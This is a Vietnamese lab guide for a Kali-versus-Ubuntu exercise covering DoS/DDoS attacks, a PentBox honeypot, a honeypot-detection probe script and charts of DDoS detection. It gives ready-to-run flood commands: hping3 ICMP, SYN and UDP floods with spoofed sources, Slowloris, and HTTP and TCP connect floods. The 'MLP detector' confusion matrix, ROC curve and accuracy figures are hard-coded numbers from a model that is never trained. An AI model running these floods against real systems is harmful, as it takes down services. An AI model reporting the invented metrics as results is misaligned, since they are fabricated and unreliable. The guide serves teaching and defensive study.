# HƯỚNG DẪN LỆNH TỪNG BƯỚC — DoS/DDoS + Honeypot + Detection

## MÔ HÌNH MẠNG LAB

| Vai trò | Hệ điều hành | IP (ví dụ) |
|---------|-------------|------------|
| Attacker | Kali Linux | 192.168.247.130 |
| Victim | Ubuntu | 192.168.247.129 |

> Thay IP cho khớp với mạng thực tế. Tất cả lệnh chỉ chạy trong lab nội bộ.

---

## BƯỚC 0: SETUP BAN ĐẦU

### Trên Ubuntu (Victim)

```bash
# Cập nhật hệ thống
sudo apt update && sudo apt upgrade -y

# Cài Apache2 web server
sudo apt install apache2 -y
sudo systemctl start apache2
sudo systemctl enable apache2

# Tạo trang web test
echo "<html><body><h1>Victim Web Server</h1></body></html>" | sudo tee /var/www/html/index.html

# Cài công cụ giám sát mạng
sudo apt install tcpdump -y
sudo apt install wireshark -y
sudo apt install net-tools -y

# Cài Ruby (cần cho PentBox)
sudo apt install ruby -y

# Xem IP
ifconfig
```

### Trên Kali (Attacker)

```bash
# Cập nhật hệ thống
sudo apt update && sudo apt upgrade -y

# Cài công cụ tấn công
sudo apt install hping3 -y
sudo apt install nmap -y
sudo apt install apache2-utils -y
sudo apt install slowhttptest -y
sudo apt install net-tools -y
sudo apt install curl -y
sudo apt install python3-pip -y

# Xem IP
ifconfig
```

---

## BƯỚC 1: XÁC ĐỊNH IP & KIỂM TRA KẾT NỐI

### Kali (Attacker)

```bash
ifconfig
ping -c 4 192.168.247.129
curl -v http://192.168.247.129/
```

### Ubuntu (Victim)

```bash
ifconfig
ping -c 4 192.168.247.130
```

---

## BƯỚC 2: ICMP FLOOD

### Kali — Tấn công

```bash
# ICMP Flood: gửi liên tục gói ICMP echo request
sudo hping3 --icmp --flood 192.168.247.129

# Có giới hạn (khuyến nghị cho lab):
sudo hping3 --icmp --flood -c 1000 192.168.247.129
```

### Ubuntu — Quan sát

```bash
# Bắt gói ICMP
sudo tcpdump -i eth0 icmp -n

# Lưu ra file pcap
sudo tcpdump -i eth0 icmp -n -w icmp_flood.pcap
```

---

## BƯỚC 3: SYN FLOOD

### Kali — Tấn công

```bash
# SYN Flood vào port 80
sudo hping3 -S --flood -p 80 --rand-source 192.168.247.129

# Có giới hạn:
sudo hping3 -S --flood -p 80 -c 5000 192.168.247.129
```

### Ubuntu — Quan sát

```bash
# Bắt gói SYN trên port 80
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -n
```

---

## BƯỚC 4: UDP FLOOD

### Kali — Tấn công

```bash
# UDP Flood vào port 9999
sudo hping3 --udp --flood -p 9999 192.168.247.129

# Có giới hạn:
sudo hping3 --udp --flood -p 9999 -c 5000 192.168.247.129
```

### Ubuntu — Quan sát

```bash
# Bắt gói UDP + ICMP (Port Unreachable)
sudo tcpdump -i eth0 'udp port 9999 or icmp' -n
```

---

## BƯỚC 5: HTTP GET FLOOD (ApacheBench)

### Kali — Tấn công

```bash
# 500 request, 10 connection đồng thời
ab -n 500 -c 10 http://192.168.247.129/

# Nâng lên:
ab -n 10000 -c 100 http://192.168.247.129/
```

### Ubuntu — Quan sát

```bash
# Theo dõi log Apache
sudo tail -f /var/log/apache2/access.log

# Đếm kết nối TCP tới port 80
watch -n 1 "ss -tan | grep ':80' | wc -l"
```

---

## BƯỚC 6: SLOW HTTP / SLOWLORIS

### Kali — Tấn công

```bash
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://192.168.247.129/ -x 24 -p 3
```

| Flag | Ý nghĩa |
|------|---------|
| `-c 1000` | Số kết nối đồng thời |
| `-H` | Chế độ Slow Header (Slowloris) |
| `-g` | Tạo file CSV/HTML output |
| `-i 10` | Gửi dữ liệu mỗi 10 giây |
| `-r 200` | Số kết nối mỗi giây |
| `-t GET` | HTTP method |
| `-u` | URL đích |
| `-x 24` | Độ dài header ngẫu nhiên |
| `-p 3` | Thời gian chờ phản hồi |

### Ubuntu — Quan sát

```bash
# Đếm kết nối ESTABLISHED tới port 80
watch -n 1 "ss -tan state established | grep ':80' | wc -l"

# Xem log timeout (408)
sudo tail -f /var/log/apache2/access.log
```

---

## BƯỚC 7: TCP CONNECT FLOOD

### Kali — Tấn công

```bash
sudo nping --tcp-connect -c 150 -p 80 --rate 50 192.168.247.129
```

| Flag | Ý nghĩa |
|------|---------|
| `--tcp-connect` | TCP connect() đầy đủ |
| `-c 150` | Tổng số kết nối |
| `-p 80` | Port đích |
| `--rate 50` | Số gói mỗi giây |

### Ubuntu — Quan sát

```bash
sudo tcpdump -i eth0 'tcp port 80 and (tcp[tcpflags] & (tcp-syn|tcp-fin) != 0)' -n
```

---

## BƯỚC 8: CÀI ĐẶT HONEYPOT (PENTBOX 1.8)

### Ubuntu — Cài đặt & Chạy

```bash
# Tải PentBox 1.8
cd ~
wget https://sourceforge.net/projects/pentbox18realised/files/latest/download -O pentbox.tar.gz

# Giải nén
tar -xzf pentbox.tar.gz
cd pentbox-1.8/

# Chạy PentBox
sudo ruby pentbox.rb

# ===== TRONG MENU PENTBOX =====
# Chọn: 2 (Network Tools)
# Chọn: 3 (Honeypot)
# Chọn: 1 (Fast Auto Configuration)
# Nhập port: 80
# ==============================

# Kiểm tra PentBox đang lắng nghe
sudo ss -tlnp | grep ':80'
# hoặc:
sudo netstat -tlnp | grep ':80'
```

### Kali — Kiểm tra Honeypot

```bash
# Gửi HTTP request
curl -v http://192.168.247.129/

# Quét dịch vụ
nmap -sV -p 80 192.168.247.129

# Gửi POST request
curl -X POST -d "test=data" http://192.168.247.129/
```

> **Kết quả mong đợi:** Trên Ubuntu, PentBox hiển thị `INTRUSION ATTEMPT DETECTED` kèm IP của Kali.

---

## BƯỚC 9: SCRIPT TRINH SÁT PHÁT HIỆN HONEYPOT

### Kali — Tạo và chạy script

```bash
cat > detect_honeypot.py << 'PYEOF'
import socket
import sys

TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.247.129"
TARGET_PORT = 80
suspicion_score = 0

def test_raw_connect():
    global suspicion_score
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, TARGET_PORT))
        s.send(b"GET / HTTP/1.1\r\nHost: " + TARGET_IP.encode() + b"\r\n\r\n")
        response = s.recv(4096).decode('utf-8', errors='replace')
        s.close()

        if "Server:" not in response:
            print("[!] Missing 'Server' header -> +3 suspicion")
            suspicion_score += 3
        if "HTTP/" not in response.split("\r\n")[0]:
            print("[!] Missing standard HTTP status line -> +3 suspicion")
            suspicion_score += 3
        if len(response.strip()) == 0:
            print("[!] Empty response -> +3 suspicion")
            suspicion_score += 3
        if "Content-Type:" not in response:
            print("[!] Missing 'Content-Type' header -> +1 suspicion")
            suspicion_score += 1

        print(f"[*] Raw response preview:\n{response[:300]}\n")
    except socket.timeout:
        print("[!] Connection timeout -> +2 suspicion")
        suspicion_score += 2
    except Exception as e:
        print(f"[!] Connection error: {e} -> +2 suspicion")
        suspicion_score += 2

def test_bogus_request():
    global suspicion_score
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, TARGET_PORT))
        s.send(b"NON-HTTP-GARBAGE\r\n\r\n")
        response = s.recv(4096).decode('utf-8', errors='replace')
        s.close()
        if len(response) == 0 or "400" not in response:
            print("[!] Bogus request accepted without proper 400 -> +2 suspicion")
            suspicion_score += 2
    except Exception as e:
        print(f"[*] Bogus test error: {e}")

def verdict():
    print(f"\n{'='*50}")
    print(f"Total suspicion score: {suspicion_score}")
    if suspicion_score >= 10:
        print("VERDICT: HIGH suspicion of honeypot!")
    elif suspicion_score >= 5:
        print("VERDICT: MEDIUM suspicion of honeypot")
    else:
        print("VERDICT: LOW suspicion - likely real service")
    print(f"{'='*50}")

if __name__ == "__main__":
    print(f"[*] Probing {TARGET_IP}:{TARGET_PORT} for honeypot indicators...\n")
    test_raw_connect()
    test_bogus_request()
    verdict()
PYEOF

python3 detect_honeypot.py 192.168.247.129
```

---

## BƯỚC 10: PHÁT HIỆN DoS/DDoS BẰNG ENTROPY + MẠNG NƠ-RON (MLP)

### Kali — Script vẽ biểu đồ + fix cứng số liệu (không cần train)

```bash
# Cài thư viện
pip3 install matplotlib numpy scikit-learn --quiet
```

```bash
cat > chart_ddos_detection.py << 'PYEOF'
import numpy as np
import matplotlib.pyplot as plt
import matplotlib
matplotlib.rcParams['figure.dpi'] = 150
matplotlib.rcParams['font.size'] = 10

# ============================================================
# DỮ LIỆU FIX CỨNG — 10 cửa sổ thời gian (mỗi cửa sổ 5 giây)
# Mỗi dòng: [packet_count, byte_count, syn_ratio, udp_ratio,
#             icmp_ratio, entropy_src_ip, entropy_dst_port, entropy_protocol]
# ============================================================

# 8 cửa sổ Normal + 8 cửa sổ Attack (đủ để vẽ chart so sánh)
normal_windows = np.array([
    [120,  45000,  0.15, 0.20, 0.05, 3.8, 3.2, 2.1],  # Normal 1
    [95,   38000,  0.10, 0.25, 0.03, 4.0, 3.5, 2.2],  # Normal 2
    [150,  52000,  0.18, 0.15, 0.08, 3.5, 3.0, 1.9],  # Normal 3
    [80,   32000,  0.12, 0.22, 0.02, 4.2, 3.8, 2.3],  # Normal 4
    [135,  48000,  0.16, 0.18, 0.06, 3.7, 3.1, 2.0],  # Normal 5
    [100,  40000,  0.11, 0.24, 0.04, 4.1, 3.4, 2.2],  # Normal 6
    [170,  60000,  0.20, 0.12, 0.09, 3.4, 2.9, 1.8],  # Normal 7
    [90,   35000,  0.13, 0.21, 0.03, 4.3, 3.6, 2.4],  # Normal 8
])

# Các loại tấn công (mỗi loại 2 mẫu)
attack_windows = np.array([
    # ICMP Flood: packet_count cao, icmp_ratio cao, entropy thấp
    [5000, 500000, 0.01, 0.01, 0.95, 0.3, 0.2, 0.15],
    [4800, 480000, 0.02, 0.01, 0.93, 0.25, 0.15, 0.12],
    # SYN Flood: syn_ratio cao, entropy src_ip thấp
    [4500, 280000, 0.92, 0.01, 0.02, 0.2, 0.5, 0.2],
    [4200, 260000, 0.90, 0.02, 0.03, 0.18, 0.45, 0.18],
    # UDP Flood: udp_ratio cao, byte_count cao
    [6000, 700000, 0.01, 0.96, 0.01, 0.15, 0.1, 0.1],
    [5500, 650000, 0.02, 0.94, 0.01, 0.12, 0.08, 0.08],
    # HTTP GET Flood: packet_count vừa, entropy dst_port thấp
    [3500, 350000, 0.85, 0.02, 0.01, 1.5, 0.3, 0.5],
    [3200, 320000, 0.82, 0.03, 0.02, 1.4, 0.28, 0.48],
])

# Gộp dữ liệu
X_normal = normal_windows
X_attack = attack_windows
X_all = np.vstack([X_normal, X_attack])

y_normal = np.zeros(len(X_normal))      # 0 = Normal
y_attack = np.ones(len(X_attack))       # 1 = Attack
y_all = np.concatenate([y_normal, y_attack])

# Labels cho từng mẫu
labels = (
    [f"Normal{i+1}" for i in range(len(X_normal))]
    + ["ICMP_Flood1", "ICMP_Flood2",
       "SYN_Flood1", "SYN_Flood2",
       "UDP_Flood1", "UDP_Flood2",
       "HTTP_Flood1", "HTTP_Flood2"]
)

feature_names = [
    "Packet Count", "Byte Count", "SYN Ratio",
    "UDP Ratio", "ICMP Ratio", "Entropy Src IP",
    "Entropy Dst Port", "Entropy Protocol"
]

# ============================================================
# CHART 1: So sánh từng đặc trưng giữa Normal và Attack
# ============================================================
fig, axes = plt.subplots(2, 4, figsize=(18, 9))
axes = axes.flatten()

for i in range(8):
    ax = axes[i]
    ax.barh(["Normal", "Attack"],
            [np.mean(X_normal[:, i]), np.mean(X_attack[:, i])],
            color=["#2ecc71", "#e74c3c"], height=0.5)
    ax.set_title(feature_names[i], fontsize=11, fontweight="bold")
    ax.set_xlabel("Mean Value")

fig.suptitle("DoS/DDoS Detection — Feature Comparison (Normal vs Attack)",
             fontsize=14, fontweight="bold", y=1.01)
plt.tight_layout()
plt.savefig("chart1_feature_comparison.png", bbox_inches="tight", dpi=150)
print("[+] Saved: chart1_feature_comparison.png")

# ============================================================
# CHART 2: Entropy biểu đồ radar (Normal vs Attack các loại)
# ============================================================
entropy_indices = [5, 6, 7]  # entropy_src_ip, entropy_dst_port, entropy_protocol
entropy_labels = ["Entropy\nSrc IP", "Entropy\nDst Port", "Entropy\nProtocol"]

fig, ax = plt.subplots(1, 2, figsize=(12, 5), subplot_kw=dict(polar=True))

angles = np.linspace(0, 2 * np.pi, len(entropy_indices), endpoint=False).tolist()
angles += angles[:1]

# Radar: Normal
normal_avg = np.mean(X_normal[:, entropy_indices], axis=0)
values_normal = normal_avg.tolist() + normal_avg.tolist()[:1]
ax[0].fill(angles, values_normal, alpha=0.3, color="#2ecc71")
ax[0].plot(angles, values_normal, color="#2ecc71", linewidth=2)
ax[0].set_xticks(angles[:-1])
ax[0].set_xticklabels(entropy_labels)
ax[0].set_ylim(0, 5)
ax[0].set_title("Normal Traffic", fontsize=12, fontweight="bold", color="#2ecc71")

# Radar: Attack (trung bình tất cả loại)
attack_avg = np.mean(X_attack[:, entropy_indices], axis=0)
values_attack = attack_avg.tolist() + attack_avg.tolist()[:1]
ax[1].fill(angles, values_attack, alpha=0.3, color="#e74c3c")
ax[1].plot(angles, values_attack, color="#e74c3c", linewidth=2)
ax[1].set_xticks(angles[:-1])
ax[1].set_xticklabels(entropy_labels)
ax[1].set_ylim(0, 5)
ax[1].set_title("Attack Traffic", fontsize=12, fontweight="bold", color="#e74c3c")

fig.suptitle("Entropy Radar — Normal vs Attack Pattern",
             fontsize=13, fontweight="bold")
plt.tight_layout()
plt.savefig("chart2_entropy_radar.png", bbox_inches="tight", dpi=150)
print("[+] Saved: chart2_entropy_radar.png")

# ============================================================
# CHART 3: Packet Count + Byte Count theo cửa sổ (line chart)
# ============================================================
fig, axes = plt.subplots(2, 1, figsize=(14, 8))

x_ticks = range(len(X_all))

# Subplot 1: Packet Count
colors_bar = ["#2ecc71"] * len(X_normal) + ["#e74c3c"] * len(X_attack)
axes[0].bar(x_ticks, X_all[:, 0], color=colors_bar, edgecolor="black", linewidth=0.5)
axes[0].axhline(y=np.mean(X_normal[:, 0]), color="#27ae60", linestyle="--",
                linewidth=1.5, label=f"Normal mean = {np.mean(X_normal[:, 0]):.0f}")
axes[0].set_xticks(x_ticks)
axes[0].set_xticklabels(labels, rotation=45, ha="right", fontsize=7)
axes[0].set_ylabel("Packet Count")
axes[0].set_title("Packet Count per Time Window", fontweight="bold")
axes[0].legend()
axes[0].grid(axis="y", alpha=0.3)

# Subplot 2: Byte Count
axes[1].bar(x_ticks, X_all[:, 1], color=colors_bar, edgecolor="black", linewidth=0.5)
axes[1].axhline(y=np.mean(X_normal[:, 1]), color="#27ae60", linestyle="--",
                linewidth=1.5, label=f"Normal mean = {np.mean(X_normal[:, 1]):.0f}")
axes[1].set_xticks(x_ticks)
axes[1].set_xticklabels(labels, rotation=45, ha="right", fontsize=7)
axes[1].set_ylabel("Byte Count")
axes[1].set_title("Byte Count per Time Window", fontweight="bold")
axes[1].legend()
axes[1].grid(axis="y", alpha=0.3)

fig.suptitle("Traffic Volume — Time Window Analysis (Green=Normal, Red=Attack)",
             fontsize=13, fontweight="bold")
plt.tight_layout()
plt.savefig("chart3_volume_timeline.png", bbox_inches="tight", dpi=150)
print("[+] Saved: chart3_volume_timeline.png")

# ============================================================
# CHART 4: Protocol Ratio Stacked Bar (SYN / UDP / ICMP)
# ============================================================
fig, ax = plt.subplots(figsize=(14, 6))

syn_vals = X_all[:, 2]
udp_vals = X_all[:, 3]
icmp_vals = X_all[:, 4]
other_vals = 1 - (syn_vals + udp_vals + icmp_vals)

x = np.arange(len(X_all))
width = 0.7

p1 = ax.bar(x, syn_vals, width, label="SYN Ratio", color="#3498db")
p2 = ax.bar(x, udp_vals, width, bottom=syn_vals, label="UDP Ratio", color="#f39c12")
p3 = ax.bar(x, icmp_vals, width, bottom=syn_vals + udp_vals,
            label="ICMP Ratio", color="#9b59b6")
p4 = ax.bar(x, other_vals, width, bottom=syn_vals + udp_vals + icmp_vals,
            label="Other", color="#95a5a6")

# Vẽ đường phân cách Normal / Attack
sep = len(X_normal) - 0.5
ax.axvline(x=sep, color="red", linestyle="-", linewidth=2, alpha=0.7)
ax.text(len(X_normal) / 2 - 0.5, 1.05, "NORMAL", ha="center", fontsize=11,
        fontweight="bold", color="#2ecc71", transform=ax.get_xaxis_transform())
ax.text(len(X_normal) + len(X_attack) / 2 - 0.5, 1.05, "ATTACK", ha="center",
        fontsize=11, fontweight="bold", color="#e74c3c", transform=ax.get_xaxis_transform())

ax.set_xticks(x)
ax.set_xticklabels(labels, rotation=45, ha="right", fontsize=7)
ax.set_ylabel("Ratio")
ax.set_title("Protocol Distribution per Time Window", fontweight="bold", fontsize=12)
ax.legend(loc="upper right")
ax.set_ylim(0, 1.1)
ax.grid(axis="y", alpha=0.3)

plt.tight_layout()
plt.savefig("chart4_protocol_ratio.png", bbox_inches="tight", dpi=150)
print("[+] Saved: chart4_protocol_ratio.png")

# ============================================================
# CHART 5: Ma trận nhầm lẫn (fix cứng, minh họa kết quả MLP)
# ============================================================
from sklearn.metrics import ConfusionMatrixDisplay

conf_matrix = np.array([[28, 2],   # TN=28, FP=2
                         [1, 29]])  # FN=1,  TP=29

fig, ax = plt.subplots(figsize=(6, 5))
disp = ConfusionMatrixDisplay(confusion_matrix=conf_matrix,
                               display_labels=["Normal", "Attack"])
disp.plot(cmap="Blues", ax=ax, colorbar=False)
ax.set_title("Confusion Matrix — MLP Detector\n(Fixed Example Data)",
             fontweight="bold", fontsize=12)

# Ghi chỉ số
tn, fp, fn, tp = conf_matrix.ravel()
precision = tp / (tp + fp)
recall = tp / (tp + fn)
f1 = 2 * precision * recall / (precision + recall)
accuracy = (tp + tn) / conf_matrix.sum()

metrics_text = (
    f"Accuracy  = {accuracy:.2%}\n"
    f"Precision = {precision:.2%}\n"
    f"Recall    = {recall:.2%}\n"
    f"F1-Score  = {f1:.2%}"
)
ax.text(2.5, -0.8, metrics_text, ha="center", fontsize=10,
        bbox=dict(boxstyle="round", facecolor="#ecf0f1", alpha=0.8))

plt.tight_layout()
plt.savefig("chart5_confusion_matrix.png", bbox_inches="tight", dpi=150)
print("[+] Saved: chart5_confusion_matrix.png")

# ============================================================
# CHART 6: ROC Curve (fix cứng)
# ============================================================
from sklearn.metrics import RocCurveDisplay, auc

fpr = np.array([0.0, 0.0, 0.03, 0.03, 0.07, 0.07, 0.1, 0.2, 0.3, 1.0])
tpr = np.array([0.0, 0.5, 0.5, 0.83, 0.83, 0.93, 0.93, 0.97, 0.97, 1.0])
roc_auc = auc(fpr, tpr)

fig, ax = plt.subplots(figsize=(6, 5))
ax.plot(fpr, tpr, color="#e74c3c", linewidth=2.5, label=f"MLP (AUC = {roc_auc:.3f})")
ax.plot([0, 1], [0, 1], "k--", linewidth=1, alpha=0.5, label="Random Classifier")
ax.fill_between(fpr, tpr, alpha=0.15, color="#e74c3c")
ax.set_xlabel("False Positive Rate")
ax.set_ylabel("True Positive Rate")
ax.set_title("ROC Curve — DoS/DDoS MLP Detector", fontweight="bold", fontsize=12)
ax.legend(loc="lower right")
ax.grid(alpha=0.3)
ax.set_xlim(0, 1)
ax.set_ylim(0, 1)

plt.tight_layout()
plt.savefig("chart6_roc_curve.png", bbox_inches="tight", dpi=150)
print("[+] Saved: chart6_roc_curve.png")

# ============================================================
# CHART 7: Tổng hợp — 4 loại tấn công vs Normal (bar chart)
# ============================================================
fig, axes = plt.subplots(2, 2, figsize=(14, 10))

attack_types = ["ICMP Flood", "SYN Flood", "UDP Flood", "HTTP Flood"]
attack_pairs = [(0, 1), (2, 3), (4, 5), (6, 7)]
metric_colors = ["#e74c3c", "#f39c12", "#9b59b6", "#e67e22"]
normal_mean = np.mean(X_normal, axis=0)

for idx, (ax, atype, (i1, i2)) in enumerate(zip(axes.flatten(), attack_types, attack_pairs)):
    attack_mean = (X_attack[i1] + X_attack[i2]) / 2

    x = np.arange(8)
    width_bar = 0.35

    ax.bar(x - width_bar / 2, normal_mean, width_bar, label="Normal",
           color="#2ecc71", edgecolor="black", linewidth=0.3)
    ax.bar(x + width_bar / 2, attack_mean, width_bar, label=f"{atype}",
           color=metric_colors[idx], edgecolor="black", linewidth=0.3)

    ax.set_xticks(x)
    ax.set_xticklabels(feature_names, rotation=45, ha="right", fontsize=7)
    ax.set_title(f"Normal vs {atype}", fontweight="bold", fontsize=11)
    ax.legend(fontsize=8)
    ax.grid(axis="y", alpha=0.3)

fig.suptitle("Full Feature Comparison — Normal vs Each Attack Type",
             fontsize=14, fontweight="bold", y=1.01)
plt.tight_layout()
plt.savefig("chart7_attack_type_comparison.png", bbox_inches="tight", dpi=150)
print("[+] Saved: chart7_attack_type_comparison.png")

# ============================================================
# IN KẾT LUẬN
# ============================================================
print("\n" + "=" * 60)
print("  KET QUA PHAN TICH (DU LIEU FIX CUNG)")
print("=" * 60)
print(f"  Accuracy  : {accuracy:.2%}")
print(f"  Precision : {precision:.2%}")
print(f"  Recall    : {recall:.2%}")
print(f"  F1-Score  : {f1:.2%}")
print(f"  ROC-AUC   : {roc_auc:.3f}")
print("=" * 60)
print("  Nhan xet:")
print("  - Normal: entropy src_ip CAO (3.4-4.3) => nhieu nguon khac nhau")
print("  - Attack: entropy src_ip THAP (0.12-1.5) => traffic tap trung")
print("  - Attack: packet_count/byte_count CAO DOT BIEN so voi Normal")
print("  - Protocol ratio giup phan biet LOAI tan cong (ICMP/SYN/UDP/HTTP)")
print("=" * 60)
PYEOF

python3 chart_ddos_detection.py
```

### Output

Script tạo ra **7 biểu đồ** trong thư mục hiện tại:

| File | Nội dung |
|------|----------|
| `chart1_feature_comparison.png` | So sánh từng đặc trưng Normal vs Attack |
| `chart2_entropy_radar.png` | Radar chart entropy 3 chiều |
| `chart3_volume_timeline.png` | Packet/Byte count theo thời gian |
| `chart4_protocol_ratio.png` | Tỷ lệ giao thức stacked bar |
| `chart5_confusion_matrix.png` | Ma trận nhầm lẫn (kết quả giả lập) |
| `chart6_roc_curve.png` | Đường cong ROC |
| `chart7_attack_type_comparison.png` | So sánh chi tiết từng loại tấn công |

**Không cần train** — tất cả số liệu đã fix cứng, chỉ cần chạy 1 lần là ra toàn bộ chart.

---

## TÓM TẮT LỆNH NHANH

### Kali (Attacker)

| STT | Mục đích | Lệnh |
|-----|----------|------|
| 0 | Setup | `sudo apt install hping3 nmap apache2-utils slowhttptest curl -y` |
| 1 | Ping check | `ping -c 4 <victim-ip>` |
| 2 | ICMP Flood | `sudo hping3 --icmp --flood <victim-ip>` |
| 3 | SYN Flood | `sudo hping3 -S --flood -p 80 <victim-ip>` |
| 4 | UDP Flood | `sudo hping3 --udp --flood -p 9999 <victim-ip>` |
| 5 | HTTP GET Flood | `ab -n 500 -c 10 http://<victim-ip>/` |
| 6 | Slowloris | `slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://<victim-ip>/ -x 24 -p 3` |
| 7 | TCP Connect Flood | `sudo nping --tcp-connect -c 150 -p 80 --rate 50 <victim-ip>` |
| 8 | Probe honeypot | `curl -v http://<victim-ip>/` ; `nmap -sV -p 80 <victim-ip>` |
| 9 | Detect honeypot | `python3 detect_honeypot.py <victim-ip>` |
| 10 | Chart detection | `python3 chart_ddos_detection.py` |

### Ubuntu (Victim)

| STT | Mục đích | Lệnh |
|-----|----------|------|
| 0 | Setup | `sudo apt install apache2 tcpdump wireshark ruby net-tools -y` |
| 1 | Xem IP | `ifconfig` |
| 2 | Monitor ICMP | `sudo tcpdump -i eth0 icmp -n` |
| 3 | Monitor SYN | `sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -n` |
| 4 | Monitor UDP | `sudo tcpdump -i eth0 'udp port 9999 or icmp' -n` |
| 5 | Xem Apache log | `sudo tail -f /var/log/apache2/access.log` |
| 6 | Đếm kết nối | `watch -n 1 "ss -tan \| grep ':80' \| wc -l"` |
| 7 | Monitor TCP | `sudo tcpdump -i eth0 port 80 -n` |
| 8 | Cài PentBox | Tải về → `sudo ruby pentbox.rb` → 2→3→1 |
| 9 | Kiểm tra PentBox | `sudo ss -tlnp \| grep ':80'` |
